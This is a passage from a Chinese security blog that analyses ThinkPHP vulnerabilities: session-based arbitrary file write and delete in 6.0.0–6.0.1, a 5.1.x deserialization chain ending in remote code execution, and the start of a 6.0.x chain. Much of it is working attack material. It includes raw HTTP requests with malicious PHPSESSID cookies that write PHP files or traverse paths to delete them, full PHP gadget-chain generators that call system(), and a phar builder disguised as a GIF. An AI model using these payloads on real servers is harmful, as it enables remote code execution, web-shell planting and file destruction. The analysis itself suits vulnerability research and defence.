<p>在目标环境为Windows且开启session的情况下，容易遭受任意文件删除攻击。</p>
</li>
<li class="lvl-2">
<p>在目标环境开启session且写入的session可控的情况下，容易遭受任意文件写入攻击。</p>
</li>
</ul>
<h2 id="漏洞环境">漏洞环境:</h2>
<p>版本:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ThinkPHP V6.0.0-v6.0.1</span><br><span class="line">php v7.3.4</span><br></pre></td></tr></table></figure>
<p>回退thinkphp版本的方法</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">修改composer.json文件的下面内容,指定&quot;topthink/framework&quot;: &quot;6.0.1&quot;,</span><br><span class="line">  &quot;require&quot;: &#123;</span><br><span class="line">        &quot;php&quot;: &quot;&gt;=7.1.0&quot;,</span><br><span class="line">        &quot;topthink/framework&quot;: &quot;6.0.1&quot;,</span><br><span class="line">        &quot;topthink/think-orm&quot;: &quot;2.0.30&quot;</span><br><span class="line">    &#125;,</span><br><span class="line">    </span><br><span class="line">然后打开命令行输入下面指令进行回退</span><br><span class="line">composer update</span><br></pre></td></tr></table></figure>
<p>环境搭建</p>
<ol>
<li class="lvl-3">
<p>进入\tp6.0\app\middleware.php开启session</p>
<p><img src="https://ltmthink-blogimages.oss-cn-hangzhou.aliyuncs.com/imgs/202401242042350.png" alt="image-20240120235630354"></p>
</li>
<li class="lvl-3">
<p>在Index.php文件中添加可以控制session内容的方法</p>
<p><img src="https://ltmthink-blogimages.oss-cn-hangzhou.aliyuncs.com/imgs/202401242042351.png" alt="image-20240120235657131"></p>
</li>
</ol>
<h2 id="漏洞分析">漏洞分析:</h2>
<h4 id="1-sessionId的控制">1.sessionId的控制</h4>
<p>thinkphp开启session初始化后,每次处理网页请求会调用SessionInit::handle对session进行初始化。</p>
<p>开启session后在默认的配置下是会将cookie中PHPSESSID的值作为$sessionid的值</p>
<p><img src="https://ltmthink-blogimages.oss-cn-hangzhou.aliyuncs.com/imgs/202401242042352.png" alt="image-20240121001503183"></p>
<p>再进入第60行的SessionInit::setId方法。可以发现只要我们的<code>$sessionid</code>长度为32个字节,即可控制<code>$this-&gt;id</code>为<code>$sessionid</code>。</p>
<p><img src="https://ltmthink-blogimages.oss-cn-hangzhou.aliyuncs.com/imgs/202401242042353.png" alt="image-20240121001832529"></p>
<h4 id="2-session值的控制">2.session值的控制</h4>
<p>再来分析通过助手函数session()保存传入的session值的逻辑</p>
<p><img src="https://ltmthink-blogimages.oss-cn-hangzhou.aliyuncs.com/imgs/202401242042354.png" alt="image-20240121002514844"></p>
<p>进入session(),顺着处理逻辑继续进入Session::set,发现Arr::set</p>
<p><img src="https://ltmthink-blogimages.oss-cn-hangzhou.aliyuncs.com/imgs/202401242042355.png" alt="image-20240121002805111"></p>
<p>然后再继续进入Arr::set,可以发现在这里Arr::set的作用就是给<code>$this-&gt;data</code>数组添加键值对对<code>'session_name'=&gt;$_POST['value']</code>。</p>
<p><img src="https://ltmthink-blogimages.oss-cn-hangzhou.aliyuncs.com/imgs/202401242042356.png" alt="image-20240121002745094"></p>
<p>现在我们已经知道session的内容保存在<code>$this-&gt;data</code>中</p>
<h4 id="3-session文件操作">3.session文件操作</h4>
<p>session文件的生成的处理函数在SessionInit::end中</p>
<p><img src="https://ltmthink-blogimages.oss-cn-hangzhou.aliyuncs.com/imgs/202401242042357.png" alt="image-20240121003407620"></p>
<p>进入save方法,这里write对应于session文件的生成,delete对应于session文件的生成</p>
<p><img src="https://ltmthink-blogimages.oss-cn-hangzhou.aliyuncs.com/imgs/202401242042358.png" alt="image-20240121003559923"></p>
<h5 id="任意文件上传漏洞">任意文件上传漏洞</h5>
<p>先来分析write方法,该方法位于tp6.0\vendor\topthink\framework\src\think\session\driver\File.php的File类中</p>
<p><img src="https://ltmthink-blogimages.oss-cn-hangzhou.aliyuncs.com/imgs/202401242042359.png" alt="image-20240121004120765"></p>
<p>所以通过控制PHPSEEIONID和写入session的内容我们可以实现上传可控文件名和内容的文件到\tp6.0\runtime\session\目录下</p>
<p>payload数据包类似以下形式</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST /tp6.0/public/index.php/index/test HTTP/1.1</span><br><span class="line">Host: localhost</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 24</span><br><span class="line">Origin: http://localhost</span><br><span class="line">Connection: close</span><br><span class="line">Referer: http://localhost/tp6.0/public/index.php/index/test</span><br><span class="line">Cookie: PHPSESSID=1234567890123456789012345678.php</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line"></span><br><span class="line">value=&lt;?php phpinfo();?&gt;</span><br></pre></td></tr></table></figure>
<p>在runtime/session/目录生成可控文件名文件内容的php文件</p>
<p><img src="https://ltmthink-blogimages.oss-cn-hangzhou.aliyuncs.com/imgs/202401242042360.png" alt="image-20240121005558191"></p>
<h5 id="任意文件删除漏洞">任意文件删除漏洞</h5>
<p>再来分析delete方法,该方法也位于File类中</p>
<p><img src="https://ltmthink-blogimages.oss-cn-hangzhou.aliyuncs.com/imgs/202401242042361.png" alt="image-20240121004750650"></p>
<p>在windows平台下可以绕过sess_实现文件删除,linux下就不可以了</p>
<p>payload数据包类似以下形式,注意PHPSESSIONID为32个字节</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">//这个数据宝将会删除/runtime/session/目录下的a.php文件(如果该目录下有这个文件的话)</span><br><span class="line">GET /tp6.0/public/index.php HTTP/1.1</span><br><span class="line">Host: localhost</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Connection: close</span><br><span class="line">Cookie: PHPSESSID=12345678901234567890123/../a.php</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br></pre></td></tr></table></figure>
<h2 id="漏洞总结">漏洞总结:</h2>
<ul class="lvl-0">
<li class="lvl-2">
<p>在目标环境为Windows且开启session的情况下，容易遭受任意文件删除攻击。</p>
</li>
<li class="lvl-2">
<p>在目标环境开启session且写入的session可控的情况下，容易遭受任意文件写入攻击。</p>
</li>
</ul>
]]></content>
      <categories>
        <category>thinkphp框架漏洞</category>
      </categories>
      <tags>
        <tag>php</tag>
        <tag>thinkphp漏洞</tag>
      </tags>
  </entry>
  <entry>
    <title>thinkphp-5.1.*-反序列化漏洞</title>
    <url>/LtmThink/2024/01/17/thinkphp-5.1-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/</url>
    <content><![CDATA[<h2 id="漏洞环境">漏洞环境:</h2>
<p>版本:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ThinkPHP V5.1.41</span><br><span class="line">php v7.1.9</span><br></pre></td></tr></table></figure>
<p>测试代码:</p>
<p>application目录下新建一个一个模块test在controller文件夹内创建Test.php内容如下</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">#命名空间app默认位于application</span><br><span class="line">namespace app\test\controller;</span><br><span class="line"></span><br><span class="line">class Test</span><br><span class="line">&#123;</span><br><span class="line">	//访问http://localhost/tp5/public/index.php/test/test/hello</span><br><span class="line">	//或者传递参数访问http://localhost/tp5/public/index.php/test/test/hello/pass/参数</span><br><span class="line">    public function hello($pass = &#x27;pass&#x27;)</span><br><span class="line">    &#123;</span><br><span class="line">        unserialize(base64_decode($pass));</span><br><span class="line">        return &#x27;hello&#x27;;</span><br><span class="line">    &#125;</span><br><span class="line">	</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="漏洞分析">漏洞分析:</h2>
<p>反序列化利用链的起点在thinkphp/library/think/process/pipes/Windows.php中</p>
<p><code>__destruct() //该方法在对象被销毁时触发</code></p>
<p><img src="https://ltmthink-blogimages.oss-cn-hangzhou.aliyuncs.com/imgs/202401171253419.png" alt="image-20240115224750937"></p>
<p>我们进入removeFiles函数中,可以发现这里有一个文件删除的功能点。通过file_exists判断文件是否存在然后删除。</p>
<p><img src="https://ltmthink-blogimages.oss-cn-hangzhou.aliyuncs.com/imgs/202401171243853.png" alt="image-20240116125512688"></p>
<p>这里存在两个漏洞一个是反序列化+任意文件删除的漏洞,文件删除漏洞的payload很简单这里直接给出</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">namespace think\process\pipes&#123;</span><br><span class="line">    class Windows</span><br><span class="line">    &#123;</span><br><span class="line">        private $files;</span><br><span class="line">        public function __construct()</span><br><span class="line">        &#123;</span><br><span class="line">            $this-&gt;files=[&quot;D:\\test.txt&quot;];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">namespace&#123;</span><br><span class="line">    use think\process\pipes\Windows;</span><br><span class="line">    echo (base64_encode(serialize(new Windows())));</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<p>还有一个就是反序列化+rce的漏洞了。我们知道file_exists会将触发__toString方法,所以这条反序列化链的下一步是寻找触发可以触发<code>__toString</code>的类。</p>
<p><code>__toString() //把类当作字符串使用时触发</code></p>
<p>通过全局搜索可以发现在thinkphp\library\think\model\concern\Conversion.php中存在__toString方法</p>
<p><img src="https://ltmthink-blogimages.oss-cn-hangzhou.aliyuncs.com/imgs/202401171243854.png" alt="image-20240116130749395"></p>
<p>但因为Conversion为trial所以我们无法直接实例化,我们需要寻找一个类使得Windows可以和Conversion建立联系</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Trait介绍:</span><br><span class="line">Trait 和 Class 相似，无法通过 trait 自身来实例化。从基类继承的成员会被 trait 插入的成员所覆盖。优先顺序是来自当前类的成员覆盖了 trait 的方法，而 trait 则覆盖了被继承的方法。</span><br></pre></td></tr></table></figure>
<p>发现Model类符合我们的要求,但因为Model为抽象类不能直接实例化,我们还要寻找一个继承Model类的类作为跳板</p>
<p><img src="https://ltmthink-blogimages.oss-cn-hangzhou.aliyuncs.com/imgs/202401171243855.png" alt="image-20240116131403032"></p>
<p>发现Pivot类符合要求</p>
<p><img src="https://ltmthink-blogimages.oss-cn-hangzhou.aliyuncs.com/imgs/202401171243856.png" alt="image-20240116131914348"></p>
<p>先来理一理到这一步为止我们构造的反序列化链Windows-&gt;Pivot(继承于Model带有Conversion的<code>__toString</code>方法)。如果类Pivot被当作字符串处理就会触发trial的<code>__toString</code>方法。所以截至现在序列化字符串的构造应该是下面这样的</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">think</span>&#123;</span><br><span class="line">	<span class="title class_">abstract</span> <span class="title class_">class</span> <span class="title class_">Model</span>&#123;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="title class_">namespace</span> <span class="title class_">think</span>\<span class="title class_">process</span>\<span class="title class_">pipes</span>&#123;</span><br><span class="line">	<span class="title class_">use</span> <span class="title class_">think</span>\<span class="title class_">model</span>\<span class="title class_">Pivot</span>;</span><br><span class="line">	<span class="class"><span class="keyword">class</span> <span class="title">Windows</span></span></span><br><span class="line"><span class="class">	</span>&#123;</span><br><span class="line">		<span class="keyword">private</span> <span class="variable">$files</span>;</span><br><span class="line">		<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">		</span>&#123;</span><br><span class="line">		<span class="variable language_">$this</span>-&gt;files=[<span class="keyword">new</span> <span class="title class_">Pivot</span>()];</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">think</span>\<span class="title class_">model</span>&#123;</span><br><span class="line">	<span class="title class_">use</span> <span class="title class_">think</span>\<span class="title class_">Model</span>;</span><br><span class="line">	<span class="class"><span class="keyword">class</span> <span class="title">Pivot</span> <span class="keyword">extends</span> <span class="title">Model</span></span></span><br><span class="line"><span class="class">	</span>&#123;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span>&#123;</span><br><span class="line">	<span class="title class_">use</span> <span class="title class_">think</span>\<span class="title class_">process</span>\<span class="title class_">pipes</span>\<span class="title class_">Windows</span>;</span><br><span class="line">	<span class="keyword">echo</span> (<span class="title function_ invoke__">base64_encode</span>(<span class="title function_ invoke__">serialize</span>(<span class="keyword">new</span> <span class="title class_">Windows</span>())));</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>接着来到__toString方法的执行</p>
<p><img src="https://ltmthink-blogimages.oss-cn-hangzhou.aliyuncs.com/imgs/202401171243857.png" alt="image-20240116132641965"></p>
<p>进入到toJson中,发现toArray自定义的函数,继续进入</p>
<p><img src="https://ltmthink-blogimages.oss-cn-hangzhou.aliyuncs.com/imgs/202401171243858.png" alt="image-20240116132704853"></p>
<p>在toArray函数中我们看到下面这段。getAtter是一个获取器可以获取数据对象的值,也就是说我们可以通过getAtter获取$key所指向的对象。</p>
<p><img src="https://ltmthink-blogimages.oss-cn-hangzhou.aliyuncs.com/imgs/202401171243859.png" alt="image-20240116134405733"></p>
<p>我们跟进getAtter,可以发现对象是通过$this-&gt;data获取的</p>
<p><img src="https://ltmthink-blogimages.oss-cn-hangzhou.aliyuncs.com/imgs/202401171243860.png" alt="image-20240116134751862"></p>
<p><img src="https://ltmthink-blogimages.oss-cn-hangzhou.aliyuncs.com/imgs/202401171243862.png" alt="image-20240116134732016"></p>
<p>回到toArray函数中,我们发现再获取了<code>$relation</code>之后,会调用$relation的visible()方法</p>
<p><img src="https://ltmthink-blogimages.oss-cn-hangzhou.aliyuncs.com/imgs/202401171243863.png" alt="image-20240116134953650"></p>
<p>我们知道<code>__call() 在对象上下文中调用不可访问的方法时会触发</code>,所以我们下一步需要寻找一个没有visible()方法却有<code>__call()</code>的类。</p>
<p>thinkphp\library\think\Request.php的Request类符合我们的要求。</p>
<p><img src="https://ltmthink-blogimages.oss-cn-hangzhou.aliyuncs.com/imgs/202401171243864.png" alt="image-20240116135319980"></p>
<p>所以我们把上文的Model类构造进行完善</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">从</span><br><span class="line">abstract class Model&#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">到</span><br><span class="line">abstract class Model&#123;</span><br><span class="line">    protected $append;</span><br><span class="line">    private $data;</span><br><span class="line">    function __construct()&#123;</span><br><span class="line">            $this-&gt;append = [&quot;aaaa&quot;=&gt;[&quot;123456&quot;]];</span><br><span class="line">            $this-&gt;data = [&quot;aaaa&quot;=&gt;new Request()];</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>接着看到call_user_func_array函数,这个函数允许我们调用系统函数,但因为通过<code>__call</code>传入的参数$args不符合要求,我们需要进行转化。事实上在Request类中,存在一个isAjax方法。通过这个方法掉用param()方法再通过param()方法调用input()方法再在input()方法中通过array_walk_recursive()函数调用filterValue()方法,在filterValue()方法中实现rce。</p>
<p>下面是跟踪的过程:</p>
<p>进入call_user_func_array调用的isAjax()方法中(<code>$this-&gt;hook[$method]</code>的值为<code>[$this,&quot;isAjax&quot;])</code></p>
<p><img src="https://ltmthink-blogimages.oss-cn-hangzhou.aliyuncs.com/imgs/202401171243865.png" alt="image-20240116170504949"></p>
<p>进入param()方法</p>
<p><img src="https://ltmthink-blogimages.oss-cn-hangzhou.aliyuncs.com/imgs/202401171243866.png" alt="image-20240116170703456"></p>
<p>进入input()方法</p>
<p><img src="https://ltmthink-blogimages.oss-cn-hangzhou.aliyuncs.com/imgs/202401171243867.png" alt="image-20240116170819717"></p>
<p>通过array_walk_recursive()函数调用filterValue()方法</p>
<p><img src="https://ltmthink-blogimages.oss-cn-hangzhou.aliyuncs.com/imgs/202401171243868.png" alt="image-20240116170915613"></p>
<p>成功rce</p>
<p><img src="https://ltmthink-blogimages.oss-cn-hangzhou.aliyuncs.com/imgs/202401171243869.png" alt="image-20240116171013746"></p>
<p>所以最终完整的payload就出来了</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">think</span>&#123;</span><br><span class="line">	<span class="title class_">abstract</span> <span class="title class_">class</span> <span class="title class_">Model</span>&#123;</span><br><span class="line">		<span class="title class_">protected</span> $<span class="title class_">append</span>;</span><br><span class="line">		<span class="keyword">private</span> <span class="variable">$data</span>;</span><br><span class="line">		<span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">			<span class="variable language_">$this</span>-&gt;append = [<span class="string">&quot;aaaa&quot;</span>=&gt;[<span class="string">&quot;123456&quot;</span>]];</span><br><span class="line">			<span class="variable language_">$this</span>-&gt;data = [<span class="string">&quot;aaaa&quot;</span>=&gt;<span class="keyword">new</span> <span class="title class_">Request</span>()];</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="class"><span class="keyword">class</span> <span class="title">Request</span></span></span><br><span class="line"><span class="class">	</span>&#123;</span><br><span class="line">		<span class="keyword">protected</span> <span class="variable">$param</span>;</span><br><span class="line">		<span class="keyword">protected</span> <span class="variable">$hook</span>;</span><br><span class="line">		<span class="keyword">protected</span> <span class="variable">$filter</span>;</span><br><span class="line">		<span class="keyword">protected</span> <span class="variable">$config</span>;</span><br><span class="line">		<span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">		<span class="variable language_">$this</span>-&gt;filter = <span class="string">&quot;system&quot;</span>;</span><br><span class="line">		<span class="variable language_">$this</span>-&gt;config = [<span class="string">&quot;var_ajax&quot;</span>=&gt;<span class="string">&#x27;&#x27;</span>];</span><br><span class="line">		<span class="variable language_">$this</span>-&gt;hook = [<span class="string">&quot;visible&quot;</span>=&gt;[<span class="variable language_">$this</span>,<span class="string">&quot;isAjax&quot;</span>]];</span><br><span class="line">		<span class="variable language_">$this</span>-&gt;param = [<span class="string">&quot;calc&quot;</span>];</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">think</span>\<span class="title class_">process</span>\<span class="title class_">pipes</span>&#123;</span><br><span class="line">	<span class="title class_">use</span> <span class="title class_">think</span>\<span class="title class_">model</span>\<span class="title class_">Pivot</span>;</span><br><span class="line">	<span class="class"><span class="keyword">class</span> <span class="title">Windows</span></span></span><br><span class="line"><span class="class">	</span>&#123;</span><br><span class="line">		<span class="keyword">private</span> <span class="variable">$files</span>;</span><br><span class="line">		<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">		</span>&#123;</span><br><span class="line">		<span class="variable language_">$this</span>-&gt;files=[<span class="keyword">new</span> <span class="title class_">Pivot</span>()];</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">think</span>\<span class="title class_">model</span>&#123;</span><br><span class="line">	<span class="title class_">use</span> <span class="title class_">think</span>\<span class="title class_">Model</span>;</span><br><span class="line">	<span class="class"><span class="keyword">class</span> <span class="title">Pivot</span> <span class="keyword">extends</span> <span class="title">Model</span></span></span><br><span class="line"><span class="class">	</span>&#123;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span>&#123;</span><br><span class="line">	<span class="title class_">use</span> <span class="title class_">think</span>\<span class="title class_">process</span>\<span class="title class_">pipes</span>\<span class="title class_">Windows</span>;</span><br><span class="line">	<span class="keyword">echo</span> (<span class="title function_ invoke__">base64_encode</span>(<span class="title function_ invoke__">serialize</span>(<span class="keyword">new</span> <span class="title class_">Windows</span>())));</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>为了满足phar反序列化利用的要求我们可以增加一些代码,生成含有phar序列化的文件</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">think</span>&#123;</span><br><span class="line">	<span class="title class_">abstract</span> <span class="title class_">class</span> <span class="title class_">Model</span>&#123;</span><br><span class="line">		<span class="title class_">protected</span> $<span class="title class_">append</span>;</span><br><span class="line">		<span class="keyword">private</span> <span class="variable">$data</span>;</span><br><span class="line">		<span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">			<span class="variable language_">$this</span>-&gt;append = [<span class="string">&quot;aaaa&quot;</span>=&gt;[<span class="string">&quot;123456&quot;</span>]];</span><br><span class="line">			<span class="variable language_">$this</span>-&gt;data = [<span class="string">&quot;aaaa&quot;</span>=&gt;<span class="keyword">new</span> <span class="title class_">Request</span>()];</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="class"><span class="keyword">class</span> <span class="title">Request</span></span></span><br><span class="line"><span class="class">	</span>&#123;</span><br><span class="line">		<span class="keyword">protected</span> <span class="variable">$param</span>;</span><br><span class="line">		<span class="keyword">protected</span> <span class="variable">$hook</span>;</span><br><span class="line">		<span class="keyword">protected</span> <span class="variable">$filter</span>;</span><br><span class="line">		<span class="keyword">protected</span> <span class="variable">$config</span>;</span><br><span class="line">		<span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">		<span class="variable language_">$this</span>-&gt;filter = <span class="string">&quot;system&quot;</span>;</span><br><span class="line">		<span class="variable language_">$this</span>-&gt;config = [<span class="string">&quot;var_ajax&quot;</span>=&gt;<span class="string">&#x27;&#x27;</span>];</span><br><span class="line">		<span class="variable language_">$this</span>-&gt;hook = [<span class="string">&quot;visible&quot;</span>=&gt;[<span class="variable language_">$this</span>,<span class="string">&quot;isAjax&quot;</span>]];</span><br><span class="line">		<span class="variable language_">$this</span>-&gt;param = [<span class="string">&quot;calc&quot;</span>];</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">think</span>\<span class="title class_">process</span>\<span class="title class_">pipes</span>&#123;</span><br><span class="line">	<span class="title class_">use</span> <span class="title class_">think</span>\<span class="title class_">model</span>\<span class="title class_">Pivot</span>;</span><br><span class="line">	<span class="class"><span class="keyword">class</span> <span class="title">Windows</span></span></span><br><span class="line"><span class="class">	</span>&#123;</span><br><span class="line">		<span class="keyword">private</span> <span class="variable">$files</span>;</span><br><span class="line">		<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">		</span>&#123;</span><br><span class="line">		<span class="variable language_">$this</span>-&gt;files=[<span class="keyword">new</span> <span class="title class_">Pivot</span>()];</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">think</span>\<span class="title class_">model</span>&#123;</span><br><span class="line">	<span class="title class_">use</span> <span class="title class_">think</span>\<span class="title class_">Model</span>;</span><br><span class="line">	<span class="class"><span class="keyword">class</span> <span class="title">Pivot</span> <span class="keyword">extends</span> <span class="title">Model</span></span></span><br><span class="line"><span class="class">	</span>&#123;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span>&#123;</span><br><span class="line">	<span class="title class_">use</span> <span class="title class_">think</span>\<span class="title class_">process</span>\<span class="title class_">pipes</span>\<span class="title class_">Windows</span>;</span><br><span class="line">	@<span class="title function_ invoke__">unlink</span>(<span class="string">&#x27;shell.jpg&#x27;</span>);</span><br><span class="line">	<span class="variable">$phar</span> = <span class="keyword">new</span> <span class="title class_">Phar</span>(<span class="string">&quot;shell.phar&quot;</span>); <span class="comment">//</span></span><br><span class="line">	<span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">startBuffering</span>();</span><br><span class="line">	<span class="variable">$phar</span> -&gt; <span class="title function_ invoke__">setStub</span>(<span class="string">&#x27;GIF89a&#x27;</span>.<span class="string">&#x27;&lt;?php __HALT_COMPILER();?&gt;&#x27;</span>);</span><br><span class="line">	<span class="variable">$object</span> = <span class="keyword">new</span> <span class="title class_">Windows</span>();</span><br><span class="line">	<span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setMetadata</span>(<span class="variable">$object</span>); </span><br><span class="line">	<span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">addFromString</span>(<span class="string">&quot;a&quot;</span>, <span class="string">&quot;a&quot;</span>); <span class="comment">//添加要压缩的文件</span></span><br><span class="line"></span><br><span class="line">	<span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">stopBuffering</span>();</span><br><span class="line"></span><br><span class="line">	<span class="keyword">echo</span> (<span class="title function_ invoke__">base64_encode</span>(<span class="title function_ invoke__">serialize</span>(<span class="keyword">new</span> <span class="title class_">Windows</span>())));</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<h2 id="漏洞总结">漏洞总结:</h2>
<p>该反序列化漏洞的利用链汇总</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">起点:任意反序列化点</span><br><span class="line">--&gt;Windows::__destruct</span><br><span class="line">--&gt;Windows::removeFiles</span><br><span class="line">--&gt;file_exists(将类当作字符串触发__toString)</span><br><span class="line">--&gt;Pivot::__toString(方法继承于Model类而Model类的__toString来自于Conversion,下面的toJson()也是同样的)</span><br><span class="line">--&gt;Pivot::toJson</span><br><span class="line">--&gt;Request::visible(Request类没有visible方法触发__call)</span><br><span class="line">--&gt;Request::__call</span><br><span class="line">--&gt;通过Request类的三个方法isAjax、param、input</span><br><span class="line">--&gt;Request::filterValue</span><br><span class="line">终点:--&gt;call_user_func,最终触发rce</span><br></pre></td></tr></table></figure>
<p>总结:蛮难的。。。。。</p>
]]></content>
      <categories>
        <category>thinkphp框架漏洞</category>
      </categories>
      <tags>
        <tag>php</tag>
        <tag>thinkphp漏洞</tag>
      </tags>
  </entry>
  <entry>
    <title>thinkphp-v6.0.0-6.0.3-反序列化漏洞</title>
    <url>/LtmThink/2024/01/21/thinkphp-v6.0.0-6.0.3-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/</url>
    <content><![CDATA[<h2 id="漏洞环境">漏洞环境:</h2>
<p>版本:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ThinkPHP V6.0.3</span><br><span class="line">php v7.3.4</span><br></pre></td></tr></table></figure>
<p>测试代码:</p>
<p>tp6.0\app\controller\Index.php中修改类Index的hello方法</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">public function hello($name = &#x27;ThinkPHP6&#x27;)</span><br><span class="line">&#123;</span><br><span class="line">        unserialize(base64_decode($name));</span><br><span class="line">        return $name;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>通过<code>http://localhost/tp6.0/public/index.php/index/hello/name/&#123;base64字符串&#125;</code>访问</p>
<p>注意:需要配置tp6.0\config\app.php才能访问到hello方法</p>
<p><img src="https://ltmthink-blogimages.oss-cn-hangzhou.aliyuncs.com/imgs/202401211948092.png" alt="image-20240119103330215"></p>
<h2 id="漏洞分析">漏洞分析:</h2>
<p>反序列化利用链的起点在\tp6.0\vendor\topthink\think-orm\src\Model.php的__destruct()方法中</p>
<p><img src="https://ltmthink-blogimages.oss-cn-hangzhou.aliyuncs.com/imgs/202401211948093.png" alt="image-20240119103640435"></p>
<p>因为<code>$this-&gt;lazySave</code>可控,我们进入Model::save。漏洞利用需要进入Model::updateData中</p>
<p><img src="https://ltmthink-blogimages.oss-cn-hangzhou.aliyuncs.com/imgs/202401211948095.png" alt="image-20240119103839169"></p>
<p>Model::setAttrs因为$data是空数组所以无效</p>
<p><img src="https://ltmthink-blogimages.oss-cn-hangzhou.aliyuncs.com/imgs/202401211948096.png" alt="image-20240119104029538"></p>
<p>Model::isEmpty因为$this-&gt;data可以控制,所以可控</p>
<p><img src="https://ltmthink-blogimages.oss-cn-hangzhou.aliyuncs.com/imgs/202401211948097.png" alt="image-20240119104056194"></p>
<p>Model::trigger也是同理可以控制</p>
<p><img src="https://ltmthink-blogimages.oss-cn-hangzhou.aliyuncs.com/imgs/202401211948098.png" alt="image-20240119104201674"></p>
